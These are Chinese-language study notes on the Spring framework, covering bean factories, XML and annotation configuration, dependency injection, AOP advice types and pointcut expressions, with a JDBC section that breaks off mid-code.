<h2 id="Spring工厂"><a href="#Spring工厂" class="headerlink" title="Spring工厂"></a>Spring工厂</h2><blockquote>
<p>Spring使用工厂模式可以通过<code>BeanFactory</code>或者<code>ApplicationContext</code>创建bean对象</p>
</blockquote>
<p><code>BeanFactory</code>是Spring容器中的顶层接口，<code>ApplicationContext</code>是它的子接口</p>
<p>区别：创建对象的时间点不同</p>
<ul>
<li><code>BeanFactory</code>：延迟注入（使用到某个bean的时候才会注入），相比于<code>ApplicationContext</code>来说会占用更少的内存，程序启动速度更快</li>
<li><code>ApplicationContext</code>：容器启动的时候，不管用没用到，一次性创建所有bean。<code>BeanFactory</code>仅提供了最基本的依赖注入支持，<code>ApplicationContext</code>扩展了<code>BeanFactory</code>，除了有<code>BeanFactory</code>的功能，还有额外的更多功能，所以一般使用<code>ApplicationContext</code>。</li>
</ul>
<p><code>ApplicationContext</code>的实现类</p>
<ol>
<li><code>ClassPathXmlApplication</code>：把上下文文件当成类路径资源</li>
<li><code>FileSystemXmlApplication</code>：从文件系统中的XML文件载入上下文定义信息</li>
<li><code>XmlWebApplicationContext</code>：从Web系统中的XML文件载入上下文定义信息</li>
</ol>
<h2 id="配置方式"><a href="#配置方式" class="headerlink" title="配置方式"></a>配置方式</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">xmlns:p</span>=<span class="string">&quot;http://www.springframework.org/schema/p&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.6.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="XML形式"><a href="#XML形式" class="headerlink" title="XML形式"></a>XML形式</h3><blockquote>
<ul>
<li>XML配置文件指示IoC容器创建JavaBean组件，</li>
<li>把id为<code>servlet</code>的组件通过属性<code>dataSource</code>（即调用<code>setDataSource()</code>方法）注入到组件中</li>
</ul>
</blockquote>
<p><strong>bean标签</strong></p>
<blockquote>
<p><strong>由spring管理bean的生命周期</strong></p>
<p>id: javabean的id</p>
<p>class: 包名+类名</p>
<p>scope：request （一次请求之内都是统一bean）<br>              session（一次会话之内都是一个bean）<br>              singleton 单例<br>              prototype原型 （每一次获取都是新的bean） 默认是单例</p>
<p>init-method:指定初始化方法</p>
<p>destroy-method:指定销毁方法</p>
</blockquote>
<p>单例对象：singleton，一个应用只有一个对象的实例</p>
<p>​                    生命周期跟着容器创建和销毁</p>
<p>多例对象：每次访问对象，都会重新创建对象实例</p>
<p>​                    创建会受到ioc容器管理，ioc容器不能控制其死亡，当不使用会被GC回收</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;serlvet1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;mock.MockServlet1&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">scope</span>=<span class="string">&quot;singleton&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;init&quot;</span> <span class="attr">destroy-method</span>=<span class="string">&quot;destory&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--DI 依赖注入 给零件装配初始值 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 8大基本类型以及String， 都是通过 value装配 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;a&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;lines&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 引用类型装配的时候，必须也要是工厂的零件之一 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;mockServlet2&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;serlvet2&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;maps&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">&quot;hello&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>di<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;mockServlet2s&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">&quot;serlvet2&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">&quot;serlvet2&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;serlvet2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;mock.MockServlet2&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">scope</span>=<span class="string">&quot;singleton&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;init&quot;</span> <span class="attr">destroy-method</span>=<span class="string">&quot;destory&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">&quot;applicationContext-bean.xml&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="依赖注入方式"><a href="#依赖注入方式" class="headerlink" title="依赖注入方式"></a>依赖注入方式</h3><blockquote>
<p>通过构造方法实现</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BookService</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> DataSource dataSource;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BookService</span><span class="params">(DataSource dataSource)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.dataSource = dataSource;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Annotation配置"><a href="#Annotation配置" class="headerlink" title="Annotation配置"></a>Annotation配置</h3><blockquote>
<p>通过注解形式，让Spring<strong>自动扫描Bean并组装</strong></p>
<p>XML配置相比，<code>@Autowired</code>大幅简化了注入，因为它不但可以写在<code>set()</code>方法上，还可以直接写在字段上，甚至可以写在构造方法中</p>
</blockquote>
<h4 id="开启注解扫描以及注解支持"><a href="#开启注解扫描以及注解支持" class="headerlink" title="开启注解扫描以及注解支持"></a><strong>开启注解扫描以及注解支持</strong></h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--配置的注解支持--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 开启注解扫描 base-package 表示从哪一个包开始扫描 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;dm&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="为bean添加注解"><a href="#为bean添加注解" class="headerlink" title="为bean添加注解"></a><strong>为bean添加注解</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller(&quot;1&quot;)</span> <span class="comment">//1位bean name</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line">   <span class="meta">@Autowired</span></span><br><span class="line">   <span class="meta">@Qualifier(&quot;userServiceImpl&quot;)</span></span><br><span class="line">   <span class="keyword">private</span> UserService userService;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insertUser</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      User user = <span class="keyword">new</span> User(<span class="string">&quot;mt&quot;</span>, <span class="string">&quot;123456&quot;</span>);</span><br><span class="line">      userService.insertUser(user);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ApplicationContext applicationContext = <span class="keyword">new</span> 		                                              ClassPathXmlApplicationContext(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">UserController userController = (UserController) 				                                   applicationContext.getBean(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">userController.insertUser();</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Filter过滤器：拦截web访问url地址。</p>
<p>Interceptor拦截器：拦截以 .action结尾的url，拦截Action的访问。</p>
<p>Spring AOP拦截器：只能拦截Spring管理Bean的访问（业务层Service）</p>
</blockquote>
<h2 id="常用注解"><a href="#常用注解" class="headerlink" title="常用注解"></a>常用注解</h2><h3 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h3><blockquote>
<p>相当于<bean id = " " class=" "/></p>
</blockquote>
<p>IOC</p>
<p>@Controller 控制层   @Service 业务层  @Repository dao层   @Configuration 配置层</p>
<p>@Component 其他  默认使用当前类名首字母小写作为Bean名字</p>
<p>属性：value:用于指定bean的id，如果不指定value属性，默认bean的id为当前类名，首字母小写</p>
<h3 id="注入数据"><a href="#注入数据" class="headerlink" title="注入数据"></a>注入数据</h3><blockquote>
<p>相当于<property name =" " ref= " "> </p>
<p>​            <property name = " " value= " "></p>
</blockquote>
<p>@Autowired 自动写入</p>
<ul>
<li>先判断容器是否有xxx的实现，若只有一个，则直接注入</li>
<li>找到多个实现，则先看成员变量是否和bean相同，则直接注入</li>
<li>若无，则报错</li>
</ul>
<p>使用@Qualifier去指定bean的id(默认类名)，与@autowired配置使用</p>
<p>@Resource: 相当于@Autowired+@Qualifier,以byName形式进行自动装配</p>
<h3 id="作用范围"><a href="#作用范围" class="headerlink" title="作用范围"></a>作用范围</h3><blockquote>
<p>相当于 <bean id = " " class = "" scope = " "></p>
</blockquote>
<p>@Scope:指定bean的作用范围 value:singleton,prototype,request,response</p>
<h3 id="声明周期"><a href="#声明周期" class="headerlink" title="声明周期"></a>声明周期</h3><p>@PostConstruct :用于指定初始化方法</p>
<p>@PreDestory :  用于指定销毁方法</p>
<h3 id="废弃xml"><a href="#废弃xml" class="headerlink" title="废弃xml"></a>废弃xml</h3><p><strong>@Configuration</strong></p>
<p> 用于指定当前类是一个Spring配置类。当<strong>创建容器时会从该类上加载注解</strong>，获取容器时需要使用AnnotationApplicationContext</p>
<p>属性 value:用于指定配置类的字节码</p>
<p><strong>@Bean</strong></p>
<p>该注解只能写在方法上，表名使用此方法创建一个对象，并且放入Spring容器中</p>
<p>属性： name:给当前@Bean注解方法创建的对象指定一个名称(bean的id)</p>
<p><strong>@Import</strong></p>
<p>用于导入其他配置类</p>
<p>属性： value[]用于指定其他配置类的字节码</p>
<p>@<strong>PropertySource</strong></p>
<p>用于加载.properties文件的内容</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(basePackages = &quot;com.itheima.spring&quot;)</span></span><br><span class="line"><span class="meta">@Import(&#123; JdbcConfig.class&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringConfiguration</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@PropertySource(&quot;classpath:jdbc.properties&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcConfig</span></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="4、AOP"><a href="#4、AOP" class="headerlink" title="4、AOP"></a>4、AOP</h1><blockquote>
<p>Aspect：切面，存放所有切面方法的类</p>
<p>joinpoint：连接点，被选中存在bean中的方法，一般是service方法</p>
<p>pointcut：切点，即一组连接点的集合</p>
<p>Interceptor：拦截器，是一种实现增强的方式</p>
</blockquote>
<p><strong>添加切面依赖</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 切面依赖 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.aspectj/aspectjrt --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjrt<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.aspectj/aspectjweaver --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span> 1.8.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>aop-aspect oriented programming-面向切面编程 </p>
<p>前置通知：在方法执行之前执行，返回值为boolean，返回为真，表示方法不会继续执行</p>
<p>后置通知：在方法执行结束之后的拦截，会得到方法的结果</p>
<p>异常通知：能够得到异常对象</p>
<p>环绕通知：在方法执行前后执行，目标执行的节点在这个方法之内</p>
</blockquote>
<p><strong>切面表达式</strong></p>
<table>
<thead>
<tr>
<th>标识符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>execution()</td>
<td>表达式的主体</td>
</tr>
<tr>
<td>第一个“*”符号</td>
<td>表示返回值的类型任意</td>
</tr>
<tr>
<td>com.loongshawn.method.ces</td>
<td>AOP所切的服务的包名，即，需要进行横切的业务类</td>
</tr>
<tr>
<td>包名后面的“..”</td>
<td>表示当前包及子包</td>
</tr>
<tr>
<td>第二个“*”</td>
<td>表示类名，*即所有类</td>
</tr>
<tr>
<td>.*(..)</td>
<td>表示任何方法名，括号表示参数，两个点表示任何参数类型</td>
</tr>
</tbody></table>
<h2 id="注解形式"><a href="#注解形式" class="headerlink" title="注解形式"></a>注解形式</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 开启对切面的注解支持 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span>/&gt;</span>	</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Aspect</span>  <span class="comment">//切面</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAspect</span> </span>&#123;</span><br><span class="line">    <span class="comment">//切入点</span></span><br><span class="line">    <span class="meta">@Pointcut(&quot;execution(* dm.demo..*.service.impl.*.*(..))&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pointCut</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Around(&quot;pointCut()&quot;)</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">around</span><span class="params">(ProceedingJoinPoint joinPoint)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;aroundBefore&quot;</span>);</span><br><span class="line">            Object proceed = joinPoint.proceed();</span><br><span class="line">            System.out.println(<span class="string">&quot;aroundAfter&quot;</span>);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;在&quot;</span> + <span class="keyword">new</span> Date() + <span class="string">&quot;使用参数&quot;</span> + Arrays.deepToString(joinPoint.getArgs()) + <span class="string">&quot;调用了&quot;</span></span><br><span class="line">                    + joinPoint.getSignature().getName() + <span class="string">&quot;并且得到了&quot;</span> + proceed + <span class="string">&quot;结果&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> proceed;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">@AfterReturning(pointcut = &quot;pointCut()&quot;,returning = &quot;result&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterReturning</span><span class="params">(JoinPoint jp, Object result)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;afterReturning&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h2 id="xml形式"><a href="#xml形式" class="headerlink" title="xml形式"></a>xml形式</h2><p><strong>在xml中配置切面</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;myAspect&quot;</span> <span class="attr">class</span>=<span class="string">&quot;dm.demo.aspect.MyAspect&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--面向切面的编程 最主要的目的就是批量处理或者在不影响源代码的情况下，单独修改某个方法的逻辑 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">aop:aspect</span> <span class="attr">ref</span>=<span class="string">&quot;myAspect&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* dm.demo..*.service.impl.*.*(..))&quot;</span> <span class="attr">id</span>=<span class="string">&quot;servicePC&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">aop:before</span> <span class="attr">method</span>=<span class="string">&quot;before&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;servicePC&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">aop:around</span> <span class="attr">method</span>=<span class="string">&quot;around&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;servicePC&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">aop:after-returning</span> <span class="attr">method</span>=<span class="string">&quot;afterReturning&quot;</span> <span class="attr">returning</span>=<span class="string">&quot;result&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;servicePC&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">aop:after-throwing</span> <span class="attr">method</span>=<span class="string">&quot;afterThrowing&quot;</span> <span class="attr">throwing</span>=<span class="string">&quot;e&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;servicePC&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">aop:after</span> <span class="attr">method</span>=<span class="string">&quot;after&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;servicePC&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">aop:aspect</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>切面方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">before</span><span class="params">(JoinPoint joinPoint)</span></span>&#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;before&quot;</span>);</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> Object <span class="title">around</span><span class="params">(ProceedingJoinPoint joinPoint)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">       Object proceed = joinPoint.proceed();</span><br><span class="line"></span><br><span class="line">       System.out.println(<span class="string">&quot;在&quot;</span> + <span class="keyword">new</span> Date() + <span class="string">&quot;使用参数&quot;</span> + Arrays.deepToString(joinPoint.getArgs()) + <span class="string">&quot;调用了&quot;</span></span><br><span class="line">               + joinPoint.getSignature().getName() + <span class="string">&quot;并且得到了&quot;</span> + proceed + <span class="string">&quot;结果&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> proceed;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterReturning</span><span class="params">(JoinPoint jp, Object result)</span> </span>&#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;afterReturning&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterThrowing</span><span class="params">(JoinPoint jp, Exception e)</span> </span>&#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;afterThrowing&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">(JoinPoint jp)</span> </span>&#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;after&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><strong>绑定切面</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">UserService service = (UserService) applicationContext.getBean(<span class="string">&quot;userServiceImpl&quot;</span>);</span><br><span class="line">service.insertUser(<span class="keyword">new</span> User(<span class="string">&quot;contorlller&quot;</span>, <span class="string">&quot;123456&quot;</span>));</span><br><span class="line"></span><br><span class="line">UserService serviceProxy = (UserService) JDKProxyFactory.bind(service,</span><br><span class="line">      <span class="string">&quot;dm.demo.aspect.InterceptorImpl1&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>责任链模式</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">UserService serviceProxy2 = (UserService) JDKProxyFactory.bind(serviceProxy,</span><br><span class="line">      <span class="string">&quot;dm.demo.aspect.InterceptorImpl1&quot;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="拦截器类型"><a href="#拦截器类型" class="headerlink" title="拦截器类型"></a>拦截器类型</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjrt<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.aspectj/aspectjweaver --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span> 1.8.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>interceptor拦截器</p>
</blockquote>
<ul>
<li>@Before：这种拦截器先执行拦截代码，再执行目标代码。如果拦截器抛异常，那么目标代码就不执行了；</li>
<li>@After：这种拦截器先执行目标代码，再执行拦截器代码。无论目标代码是否抛异常，拦截器代码都会执行；</li>
<li>@AfterReturning：和@After不同的是，只有当目标代码正常返回时，才执行拦截器代码；</li>
<li>@AfterThrowing：和@After不同的是，只有当目标代码抛出了异常时，才执行拦截器代码；</li>
<li>@Around：能完全控制目标代码是否执行，并可以在执行前后、抛异常后执行任意拦截代码，可以说是包含了上面所有功能。</li>
</ul>
<h1 id="5、Jdbc"><a href="#5、Jdbc" class="headerlink" title="5、Jdbc"></a>5、Jdbc</h1><p><strong>导入依赖</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-jdbc --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.6.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/mysql/mysql-connector-java --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span 